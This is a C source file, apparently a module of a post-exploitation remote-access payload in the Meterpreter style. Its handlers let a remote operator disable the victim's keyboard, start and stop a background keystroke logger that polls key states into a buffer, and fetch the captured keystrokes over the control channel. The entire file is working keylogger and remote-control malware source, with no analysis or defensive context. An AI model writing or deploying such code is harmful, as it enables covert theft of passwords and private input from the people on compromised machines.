#include "precomp.h"

#include <tchar.h>

extern HMODULE hookLibrary;

/*
 * Enables or disables keyboard input
 */
DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	BOOLEAN enable = FALSE;
	DWORD result = ERROR_SUCCESS;

	enable = packet_get_tlv_value_bool(request, TLV_TYPE_BOOL);

	// If there's no hook library loaded yet
	if (!hookLibrary)
		extract_hook_library();

	// If the hook library is loaded successfully...
	if (hookLibrary)
	{
		DWORD (*enableKeyboardInput)(BOOL enable) = (DWORD (*)(BOOL))GetProcAddress(
				hookLibrary, "enable_keyboard_input");

		if (enableKeyboardInput)
			result = enableKeyboardInput(enable);
	}
	else
		result = GetLastError();

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

typedef enum { false=0, true=1 } bool;

bool boom[1024];

HANDLE tKeyScan = NULL;
char *KeyScanBuff = NULL;
int KeyScanSize = 1024*1024;
int KeyScanIndex = 0;

void ui_keyscan_now(bool listStates[2][256], bool *iToggle) {
    unsigned int iKey = 0;

	TCHAR strLog[8] = {0};
    for (iKey = 0; iKey < 255; ++iKey)
    {
		bool bPrior, bState;
		DWORD tog = *iToggle;
        SHORT iState = GetAsyncKeyState(iKey);
        listStates[tog][iKey] = iState < 0;
		bPrior = listStates[!tog][iKey];
        bState = listStates[tog][iKey];

        // detect state change
        if (bPrior ^ bState && bState == 1)
        {
			unsigned char flags = (1<<0);

			TCHAR toHex[] = _T("0123456789ABCDEF");
            bool bShift = listStates[tog][VK_SHIFT];
            bool bCtrl = listStates[tog][VK_CONTROL];
            bool bAlt = listStates[tog][VK_MENU];
/*
			strLog[0] = bShift ? 'S' : 's';
			strLog[1] = bCtrl  ? 'C' : 'c';
			strLog[2] = bAlt   ? 'A' : 'a';
			strLog[3] = toHex[(iKey >> 4) & 0xF];
			strLog[4] = toHex[(iKey & 0xF)];
			strLog[5] = ';';
			strLog[6] = '\r';
			strLog[6] = '\n';
			OutputDebugString(strLog);
*/
			if(bShift) flags |= (1<<1);
			if(bCtrl)  flags |= (1<<2);
			if(bAlt)   flags |= (1<<3);

			if(KeyScanIndex >= KeyScanSize) KeyScanIndex = 0;
			KeyScanBuff[KeyScanIndex+0] = flags;
			KeyScanBuff[KeyScanIndex+1] = iKey;
			KeyScanIndex += 2;
        }
    }
    *iToggle = !*iToggle;
}

void ui_keyscan_proc(void) {
    bool iToggle = false;
    bool listStates[2][256] = {0};

	if(KeyScanBuff) {
		free(KeyScanBuff);
		KeyScanBuff = NULL;
		KeyScanIndex = 0;
	}

	KeyScanBuff = calloc(KeyScanSize, sizeof(char));
	while(1) {
		ui_keyscan_now(listStates, &iToggle);
		Sleep(30);
	}
}

/*
 * Starts the keyboard sniffer
 */
DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;

	if(tKeyScan) {
		result = 1;
	} else {
		// Make sure we have access to the input desktop
		if(GetAsyncKeyState(0x0a) == 0) {
			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keyscan_proc, NULL, 0, NULL);
		} else {
			// No permission to read key state from active desktop
			result = 5;
		}
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Stops they keyboard sniffer
 */
DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		TerminateThread(tKeyScan, 0);
		tKeyScan = NULL;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Returns the sniffed keystrokes
 */
DWORD request_ui_get_keys(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, KeyScanBuff);
		memset(KeyScanBuff, 0, KeyScanSize);
		KeyScanIndex = 0;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}